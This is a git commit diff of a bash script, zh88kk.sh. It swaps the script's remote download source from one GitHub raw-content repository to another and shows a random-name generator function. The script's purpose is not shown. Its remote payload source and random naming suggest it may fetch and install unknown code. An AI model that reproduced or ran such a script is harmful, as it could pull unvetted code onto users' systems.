dcc9c4a0e49d667c58d98f84bd80e4646f287c24
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-30 22:48:56 -0600

    Update zh88kk.sh

--- zh88kk.sh
+++ zh88kk.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 mode="${1:-0}"
-src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+src="https://raw.githubusercontent.com/edrivetokenbsc/2088/main"
 
 RandString() {
   n="${1:-2}"; s=""; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
